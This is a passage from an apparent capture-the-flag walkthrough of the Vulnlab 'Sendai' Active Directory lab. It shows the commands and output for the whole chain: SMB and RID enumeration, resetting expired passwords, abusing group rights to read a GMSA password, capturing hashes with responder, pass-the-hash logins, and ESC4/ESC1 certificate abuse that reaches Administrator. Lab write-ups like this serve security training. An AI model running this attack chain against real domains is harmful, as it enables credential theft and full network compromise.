class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.98.227 </span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 10:53 EDT</span><br><span class=\"line\">Nmap scan report for sendai.vl (10.10.98.227)</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 986 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">443/tcp  open  https</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds</span><br></pre></td></tr></table></figure>\n\n<p>We see a couple ports open such as SMB and LDAP, along with an HTTP server running on port 80.</p>\n<p>The HTTP server seems to be a bare IIS website, meaning there isn’t a direct service that we can exploit at this moment.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/b.png\"></p>\n<p>I ran a <code>gobuster</code> scan against the web service for about a minute to see if there were any directories we could find, though came back with no results that we can access right now.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ gobuster dir -u http://10.10.98.227 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt </span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.6</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:                     http://10.10.98.227</span><br><span class=\"line\">[+] Method:                  GET</span><br><span class=\"line\">[+] Threads:                 10</span><br><span class=\"line\">[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class=\"line\">[+] Negative Status codes:   404</span><br><span class=\"line\">[+] User Agent:              gobuster/3.6</span><br><span class=\"line\">[+] Timeout:                 10s</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in directory enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/service              (Status: 301) [Size: 151] [--&gt; http://10.10.98.227/service/]</span><br></pre></td></tr></table></figure>\n\n<p>A <code>/service</code> directory does come back valid, though it does not seem that we currently have access to the page (403 Access Denied). I’ve seen directories like this in my time doing <a href=\"https://dan-feliciano.com/2024/06/05/lustrous/\">Lustrous</a>, which involved using Kerberos authentication to access websites that we previously did not have access to. Since there seems to be no other way to authenticate with user input, I’ll make the guess that this will be part of the attack path later down the line.</p>\n<h1 id=\"Resetting-Expired-Passwords\"><a href=\"#Resetting-Expired-Passwords\" class=\"headerlink\" title=\"Resetting Expired Passwords\"></a>Resetting Expired Passwords</h1><p>Let’s take a look at SMB to see if there are any shares that we can access.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.98.227 -N        </span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">config          Disk      </span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">NETLOGON        Disk      Logon server share </span><br><span class=\"line\">sendai          Disk      company share</span><br><span class=\"line\">SYSVOL          Disk      Logon server share </span><br><span class=\"line\">Users           Disk</span><br></pre></td></tr></table></figure>\n\n<p>We seem to have access to a few shares, and the SMB login allows null authentication.</p>\n<p>If you do some enumeration into these shares, you’ll notice that we only have access to <code>sendai</code> and <code>Users</code>. The <code>Users</code> share just contains the directories of the <code>Default</code> and <code>Public</code> directories, meaning this specific share is only hosting those User folders within <code>C:\\Users</code> on the remote computer. The <code>sendai</code> share however contains a multitude of folders, specifically containing an interesting file at its root folder.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Tue Jul 18 13:31:04 2023</span><br><span class=\"line\">  ..                                DHS        0  Wed Jul 19 10:11:25 2023</span><br><span class=\"line\">  hr                                  D        0  Tue Jul 11 08:58:19 2023</span><br><span class=\"line\">  incident.txt                        A     1372  Tue Jul 18 13:34:15 2023</span><br><span class=\"line\">  it                                  D        0  Tue Jul 18 09:16:46 2023</span><br><span class=\"line\">  legal                               D        0  Tue Jul 11 08:58:23 2023</span><br><span class=\"line\">  security                            D        0  Tue Jul 18 09:17:35 2023</span><br><span class=\"line\">  transfer                            D        0  Tue Jul 11 09:00:20 2023</span><br><span class=\"line\"></span><br><span class=\"line\">7309822 blocks of size 4096. 604434 blocks available</span><br><span class=\"line\">smb: \\&gt; get incident.txt</span><br><span class=\"line\">getting file \\incident.txt of size 1372 as incident.txt (2.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/sendai-vl/c.png\"></p>\n<p>It seems as though there is a notice about poor password management&#x2F;usage within the environment, specifically from the domain users. Aside from this, the note also tells us that all users that have had their passwords reset have been expired as of where we are now.</p>\n<p>Given that a few users may have their passwords reset, we can test whether or not any of them have a null password (indicating a user with an expired password). However - we’ll need a user list in order to do so. Luckily enough - since we have null authentication to SMB, we can essentially enumerate all of the domain users using a tool such as <code>lookupsid</code>. This will brute force all of the domain SIDs of all objects within the domain that have a max RID value below 4000(we can increase this RID value, though its not needed for this machine).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-lookupsid sendai.vl/&#x27;temp&#x27;@10.10.98.227 -no-pass -domain-sids | cut -d &#x27;\\&#x27; -f 2 | awk &#x27;NR &gt;= 31 &#123;print $1&#125;&#x27; &gt; full_ul.txt</span><br></pre></td></tr></table></figure>\n\n<p>I’ve done the needful and converted all of the domain users into a wordlist. Let’s now test for any users that have an expired password.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.98.227 -u full_ul.txt -p &#x27;&#x27; --continue-on-success</span><br><span class=\"line\">[-] sendai.vl\\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE</span><br><span class=\"line\">[-] sendai.vl\\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE</span><br></pre></td></tr></table></figure>\n\n<p>You’ll receive a few false positives from users such as <code>admsvc</code> or <code>staff</code>, and this is due to the fact that these aren’t legitimate domain users. Since they aren’t domain users, SMB falls back on its null authentication for these usernames - meaning they would work regardless.</p>\n<p>As noted from the code snippet above, it seems as though <code>Elliot.Yates</code> and <code>Thomas.Powell</code> both have their passwords reset.</p>\n<p>We can reset these passwords using Impacket’s built-in <code>smbpasswd</code> tool, which will reset the passwords of the users we give it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-smbpasswd sendai.vl/&#x27;Elliot.Yates&#x27;@10.10.98.227 -newpass &#x27;Password123@&#x27;</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\">  Warning: This functionality will be deprecated in the next Impacket version  </span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">Current SMB password: </span><br><span class=\"line\">[!] Password is expired, trying to bind with a null session.</span><br><span class=\"line\">[*] Password was changed successfully.</span><br></pre></td></tr></table></figure>\n\n<p>We can then test the users authentication to LDAP using <code>crackmapexec</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.98.227 -u &#x27;Elliot.Yates&#x27; -p &#x27;Password123@&#x27;              </span><br><span class=\"line\">SMB         10.10.98.227   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.98.227   389    DC               [+] sendai.vl\\Elliot.Yates:Password123@</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have a valid user in LDAP, let’s dump the domain using Bloodhound along with its <a href=\"https://github.com/dirkjanm/BloodHound.py\">Python ingestor</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;sendai.vl&#x27; -u &#x27;Elliot.Yates&#x27; -p &#x27;Password123@&#x27; -c all -ns 10.10.98.227 --zip</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"MGTSVC-Method-1-LDAP\"><a href=\"#MGTSVC-Method-1-LDAP\" class=\"headerlink\" title=\"MGTSVC Method #1 - LDAP\"></a>MGTSVC Method #1 - LDAP</h1><p>At this point, there are two methods that you can use to get user. The intended path is to go through LDAP in order to escalate privileges, however there is also a web-focused path that I will cover after the intended.</p>\n<p>If you take a look over at Bloodhound, you’ll notice that our user <code>Elliot.Yates</code> has an interesting outbound object control.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/d.png\"></p>\n<p>It seems that we are apart of the <code>Support</code> domain group. Due to us being within the <code>Support</code> domain group, we are automatically given the right to have <code>GenericAll</code> over the <code>admsvc</code> domain group. I’ve had this privilege before, however it’s mainly been on either domain user or domain computers. The difference here is that this privilege is against a group - though it can also allow us to add our current user to that group.</p>\n<p>We can do so by using the default RPC package that comes built-in with Kali. This tool, <code>net rpc</code>, can allow us to modify the domain group and add ourselves to it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ net rpc group addmem &quot;admsvc&quot; &quot;Elliot.Yates&quot; -U sendai.vl/&quot;Elliot.Yates&quot;%&quot;Password123@&quot; -S dc.sendai.vl</span><br></pre></td></tr></table></figure>\n\n<p>We can then verify that the change has been made with the same tool.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ net rpc group members &quot;admsvc&quot; -U &quot;sendai.vl&quot;/&quot;Elliot.Yates&quot;%&quot;Password123@&quot; -S dc.sendai.vl</span><br><span class=\"line\">SENDAI\\websvc</span><br><span class=\"line\">SENDAI\\Norman.Baxter</span><br><span class=\"line\">SENDAI\\Elliot.Yates</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were added to the group successfully. Looking into these group members domain privileges, we can see that users within this group has a specific outbound object control as well.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/e.png\"></p>\n<p>Users within the <code>admsvc</code> group have the <code>ReadGMSAPassword</code> over the <code>MGTSVC$</code> account. This privilege allows us to view the Group-Managed Service Account (GMSA) password of the support account, which will return to us the NT hash of the account.</p>\n<p>Crackmapexec has a handle for this, so we can easily do it with <code>Elliot.Yates</code> credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.98.227 -u &#x27;Elliot.Yates&#x27; -p &#x27;Password123@&#x27; --gmsa           </span><br><span class=\"line\">SMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               [+] sendai.vl\\Elliot.Yates:Password123@ </span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               [*] Getting GMSA Passwords</span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               Account: mgtsvc$              NTLM: 52ece1a9[...snip...]a44c1a20</span><br></pre></td></tr></table></figure>\n\n<p>I verified that the <code>MGTSVC$</code> account has WinRM access through Bloodhound, as you can see that it is a part of the <code>Remote Management Users</code> group.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.98.227 -u &#x27;mgtsvc$&#x27; -H &#x27;52ece[...snip...]4c1a20&#x27;</span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\mgtsvc$\\Documents&gt; whoami</span><br><span class=\"line\">sendai\\mgtsvc$</span><br></pre></td></tr></table></figure>\n\n<p>This means we have successfully completed the first half of the machine. The first user flag is within <code>C:\\</code>.</p>\n<h1 id=\"MGTSVC-Method-2-WebSVC\"><a href=\"#MGTSVC-Method-2-WebSVC\" class=\"headerlink\" title=\"MGTSVC Method #2 - WebSVC\"></a>MGTSVC Method #2 - WebSVC</h1><p>This second method I discovered, credit goes out to Yeeb for this specific attack path.</p>\n<p>If we run a <code>gobuster</code> scan against the HTTP service, you’ll notice that an interesting endpoint that we can’t see on the main HTTP page of the domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ gobuster vhost --url https://sendai.vl -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k --exclude-length 334 </span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.6</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:              https://sendai.vl</span><br><span class=\"line\">[+] Method:           GET</span><br><span class=\"line\">[+] Threads:          50</span><br><span class=\"line\">[+] Wordlist:         /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span><br><span class=\"line\">[+] User Agent:       gobuster/3.6</span><br><span class=\"line\">[+] Timeout:          10s</span><br><span class=\"line\">[+] Append Domain:    true</span><br><span class=\"line\">[+] Exclude Length:   334</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Starting gobuster in VHOST enumeration mode</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Found: service.sendai.vl Status: 200 [Size: 4189]</span><br></pre></td></tr></table></figure>\n\n<p>Browsing to this subdomain (after editing it into our <code>/etc/hosts</code> file) will lead us to the DownDetector.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/f.png\"></p>\n<p>This website seems to be an internal website scan, which will verify if a subdomain within the environment is experiencing issues. It seems as though this requires no authentication, however its usability can be severe.</p>\n<p>It allows us to prompt a subdomain to check, meaning this website will probably submit an LDAP request to the subdomain that we specify. What’s great is that we actually have the ability to create a fake subdomain due to <code>Elliot.Yates</code> Machine Account Quota (MAQ). This let’s us create a computer account, to which we can use to create an LDAP record of a fake subdomain that points back to our attacker machine. If there is a service account associated with this web service, we can capture their NetNTLMv2 hash using <code>responder</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.98.227 -u &#x27;Elliot.Yates&#x27; -p &#x27;Password123@&#x27; -M maq</span><br><span class=\"line\">SMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.98.227    389    DC               [+] sendai.vl\\Elliot.Yates:Password123@ </span><br><span class=\"line\">MAQ         10.10.98.227    389    DC               [*] Getting the MachineAccountQuota</span><br><span class=\"line\">MAQ         10.10.98.227    389    DC               MachineAccountQuota: 10</span><br></pre></td></tr></table></figure>\n\n<p>It isn’t necessarily needed for us to create a computer account for this attack, as all we need to do is create the fake LDAP record. It is odd though how we have a MAQ of 10, and given that this is what I’m used to doing - I decided to set up a domain computer account anyways.</p>\n<p>Let’s first start with creating the domain computer.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-addcomputer -dc-ip 10.10.98.227 -computer-name daz -computer-pass &#x27;Password123@&#x27; sendai.vl/Elliot.Yates:&#x27;Password123@&#x27;</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully added machine account daz$ with password Password123@.</span><br></pre></td></tr></table></figure>\n\n<p>We can then use <code>dnstool.py</code> in the <a href=\"https://github.com/dirkjanm/krbrelayx\">KrbRelayX</a> library to create the fake LDAP record, using our new computer account credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 krbrelayx/dnstool.py -u &#x27;sendai.vl\\daz$&#x27; -p &#x27;Password123@&#x27; -r daz.sendai.vl -d 10.8.0.173 --action add dc.sendai.vl -dns-ip 10.10.98.227</span><br><span class=\"line\">[-] Connecting to host...</span><br><span class=\"line\">[-] Binding to host</span><br><span class=\"line\">[+] Bind OK</span><br><span class=\"line\">[-] Adding new record</span><br><span class=\"line\">[+] LDAP operation completed successfully</span><br></pre></td></tr></table></figure>\n\n<p>You’ll need to wait a few minutes for the LDAP record to update into the environment, it took around 5 minutes for me. We’ll boot up <code>responder</code> to wait for incoming LDAP requests to our attacker machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo responder -I tun0      </span><br><span class=\"line\">                                         __</span><br><span class=\"line\">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class=\"line\">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class=\"line\">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class=\"line\">                   |__|</span><br><span class=\"line\"></span><br><span class=\"line\">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0</span><br></pre></td></tr></table></figure>\n\n<p>After we’ve waited long enough, we should be able to submit a request to our controlled subdomain into DownDetector. You may receive an error, however if we look back at <code>responder</code> you’ll see that an NTLM hash was captured.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+] Listening for events...                                                                                                   </span><br><span class=\"line\"></span><br><span class=\"line\">[HTTP] NTLMv2 Client   : 10.10.98.227</span><br><span class=\"line\">[HTTP] NTLMv2 Username : SENDAI\\websvc</span><br><span class=\"line\">[HTTP] NTLMv2 Hash     : websvc::SENDAI:7ddba3792facbeff:2B[...snip...]00000000000000</span><br></pre></td></tr></table></figure>\n\n<p>We can crack this hash using <code>hashcat</code>, to which we’ll be using a hash identifier value of 5600.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 5600 websvc.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">2366e65c8e9a29435777b0a001000000000000000000000000000000000000900240048005400540050002f00640061007a002e00730065006e006400610069002e0076006c000000000000000000:[...snip...]</span><br><span class=\"line\">   </span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 5600 (NetNTLMv2)</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were successfully able to crack the hash for <code>websvc</code>. Looking back at Bloodhound, we can see that this user is within the <code>admsvc</code> group along with the <code>Elliot.Yates</code> user that we added to in Method #1.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/g.png\"></p>\n<p>This means we can also use <code>crackmapexec</code> along with <code>websvc</code> creds to read the GMSA password and get the NT hash for <code>mgtsvc$</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.98.227 -u &#x27;websvc&#x27; -p &#x27;(WEBSVC PASSWORD)&#x27; --gmsa          </span><br><span class=\"line\">SMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               [+] sendai.vl\\websvc:[...snip...] </span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               [*] Getting GMSA Passwords</span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               Account: mgtsvc$              NTLM: 52ece[...snip...]4c1a20</span><br></pre></td></tr></table></figure>\n\n<p>We can then use the <code>mgtsvc$</code> NT hash to authenticate to WinRM using PTH.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.98.227 -u &#x27;mgtsvc$&#x27; -H &#x27;52ece[...snip...]4c1a20&#x27;</span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\mgtsvc$\\Documents&gt; whoami</span><br><span class=\"line\">sendai\\mgtsvc$</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"PrivEsc-Method-1-PrivEscCheck\"><a href=\"#PrivEsc-Method-1-PrivEscCheck\" class=\"headerlink\" title=\"PrivEsc Method #1 - PrivEscCheck\"></a>PrivEsc Method #1 - PrivEscCheck</h1><p>If you may have noticed before, ADCS is running on the machine. This can be assumed due to the <code>ca-operators</code> domain group within the environment, and also due to the fact that port 9389 is running (this isn’t conclusive, but generally I’ve seen this port open with machines running ADCS).</p>\n<p>The only issue is that we do not currently possess the capabilities to retrieve vulnerable ADCS templates, as we do not control a user account within the <code>ca-operators</code> group.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/h.png\"></p>\n<p>We’ll need to take control of either <code>Anthony.Smith</code> or <code>Clifford.Davey</code> in order to exploit ADCS. If you scan for vulnerable ADCS templates using any of the domain accounts we have access to, you won’t find any vulnerable templates (at least to what I could see).</p>\n<p>Given that we have access to the filesystem at this point, my assumption is that we’ll need to do a bit of credential hunting.</p>\n<p>My normal attack methodology would be to look through odd files or potentially cached DPAPI credentials with tools like <a href=\"https://github.com/GhostPack/Seatbelt\">Seatbelt</a>, however I discovered an odd service that was running on the machine when I ran a scan with <code>ps</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (sendai) &gt; ps</span><br><span class=\"line\"></span><br><span class=\"line\"> Pid    Ppid   Owner            Arch     Executable                                  Session </span><br><span class=\"line\">====== ====== ================ ======== =========================================== =========</span><br><span class=\"line\">......</span><br><span class=\"line\">2584   628                              helpdesk.exe                                -1</span><br></pre></td></tr></table></figure>\n\n<p>This executable doesn’t seem to be ran naturally, at least in the AD environments that I’ve tested in the past. We can receive if any usernames or passwords were passed into this executable in memory (during the time of its execution) by using tools such as <a href=\"https://github.com/itm4n/PrivescCheck\">PrivEscCheck</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; Import-Module .\\PrivescCheck.ps1</span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; Invoke-PrivescCheck</span><br><span class=\"line\">......</span><br><span class=\"line\">Name        : Support</span><br><span class=\"line\">DisplayName :</span><br><span class=\"line\">ImagePath   : C:\\WINDOWS\\helpdesk.exe -u clifford.davey -p [...snip...] -k netsvcs</span><br><span class=\"line\">User        : LocalSystem</span><br><span class=\"line\">StartMode   : Automatic</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the <code>helpdesk.exe</code> had the credentials for <code>Clifford.Davey</code> passed into them at runtime. </p>\n<h1 id=\"PrivEsc-Method-1-cont-ADCS\"><a href=\"#PrivEsc-Method-1-cont-ADCS\" class=\"headerlink\" title=\"PrivEsc Method #1 (cont.) - ADCS\"></a>PrivEsc Method #1 (cont.) - ADCS</h1><p>We should now have the password for this user, meaning we can properly exploit <a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation\">ADCS</a>. We’ll use <code>certipy-ad</code> for this, though you could also exploit this locally on the machine using <a href=\"https://github.com/GhostPack/Certify\">Certify</a> alongside <a href=\"https://github.com/GhostPack/Rubeus\">Rubeus</a>. The only issue with the Windows solution is that you would need to drop Certify to the filesystem which can take a bit longer.</p>\n<p>Since we have access to the domain users credentials, we’ll just use <code>certipy-ad</code>, which should be built-in to Kali (in case you don’t have it, check <a href=\"https://github.com/ly4k/Certipy\">here</a>). We’ll start by enumerating the ADCS templates.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad find -vulnerable -dc-ip 10.10.98.227 -u &#x27;clifford.davey&#x27;@sendai.vl -p &#x27;(CLIFFORD.DAVEY PASSWORD)&#x27;</span><br><span class=\"line\">......</span><br><span class=\"line\">[*] Saved text output to &#x27;20240707011831_Certipy.txt&#x27;</span><br><span class=\"line\">[*] Saved JSON output to &#x27;20240707011831_Certipy.json&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>If you’ll notice, this should save two text files (alongside Bloodhound data) to our local system. Looking into this file gives us the indication of a potential exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Certificate Templates</span><br><span class=\"line\">  0</span><br><span class=\"line\">    Template Name                       : SendaiComputer</span><br><span class=\"line\">    Display Name                        : SendaiComputer</span><br><span class=\"line\">    Certificate Authorities             : sendai-DC-CA</span><br><span class=\"line\">    Enabled                             : True</span><br><span class=\"line\">    Client Authentication               : True</span><br><span class=\"line\">......</span><br><span class=\"line\">[!] Vulnerabilities</span><br><span class=\"line\">ESC4                              : &#x27;SENDAI.VL\\\\ca-operators&#x27; has dangerous permissions</span><br></pre></td></tr></table></figure>\n\n<p>ESC4 is a vulnerability that gives us the potential to alter a template and create an exploitable misconfiguration on a section of the template. As proclaimed in the HackTricks article that I posted above, we are able to modify the template’s following permissions:</p>\n<ul>\n<li><strong>Owner:</strong> Grants implicit control over the object, allowing for the modification of any attributes.</li>\n<li><strong>FullControl:</strong> Enables complete authority over the object, including the capability to alter any attributes.</li>\n<li><strong>WriteOwner:</strong> Permits the alteration of the object’s owner to a principal under the attacker’s control.</li>\n<li><strong>WriteDacl:</strong> Allows for the adjustment of access controls, potentially granting an attacker FullControl.</li>\n<li><strong>WriteProperty:</strong> Authorizes the editing of any object properties.</li>\n</ul>\n<p>To keep things at a low-level, we can essentially modify the ESC4 template to become vulnerable to ESC1. We can then exploit the ESC1 vulnerability and gain a service ticket as the Administrator user.</p>\n<p>We’ll first start by converting said template to be vulnerable to ESC4.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad template -username &#x27;clifford.davey&#x27;@sendai.vl -password &#x27;(CLIFFORD.DAVEY PASSWORD)&#x27; -template SendaiComputer -save-old</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Saved old configuration for &#x27;SendaiComputer&#x27; to &#x27;SendaiComputer.json&#x27;</span><br><span class=\"line\">[*] Updating certificate template &#x27;SendaiComputer&#x27;</span><br><span class=\"line\">[*] Successfully updated &#x27;SendaiComputer&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>Now that the template is vulnerable to ESC1, we can request for a keyfile for the Administrator user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad req -username &#x27;clifford.davey&#x27;@sendai.vl -password &#x27;(CLIFFORD.DAVEY PASSWORD)&#x27; -template SendaiComputer -ca sendai-DC-CA -target dc.sendai.vl -upn administrator@sendai.vl</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting certificate via RPC</span><br><span class=\"line\">[*] Successfully requested certificate</span><br><span class=\"line\">[*] Request ID is 5</span><br><span class=\"line\">[*] Got certificate with UPN &#x27;administrator@sendai.vl&#x27;</span><br><span class=\"line\">[*] Certificate has no object SID</span><br><span class=\"line\">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><code>certipy-ad</code> will generate a keyfile for us that we can use to obtain a service ticket for this user. We’ll use the <code>auth</code> tool for this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad auth -pfx administrator.pfx -username &#x27;Administrator&#x27; -domain &#x27;sendai.vl&#x27; -dc-ip 10.10.98.227</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Using principal: administrator@sendai.vl</span><br><span class=\"line\">[*] Trying to get TGT...</span><br><span class=\"line\">[*] Got TGT</span><br><span class=\"line\">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class=\"line\">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class=\"line\">[*] Got hash for &#x27;administrator@sendai.vl&#x27;: aad3b435b51404eeaad3b435b51404ee:cfb106[...snip...]8d087a</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the NT hash for the Administrator user, we can simply use PTH with <code>evil-winrm</code> to authenticate to the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.98.227 -u &#x27;Administrator&#x27; -H &#x27;cfb106[...snip...]be8d087a&#x27;</span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cat ..\\Desktop\\root.txt</span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Given that we have read the root flag, we have now successfully compromised the machine using this method!</p>\n<h1 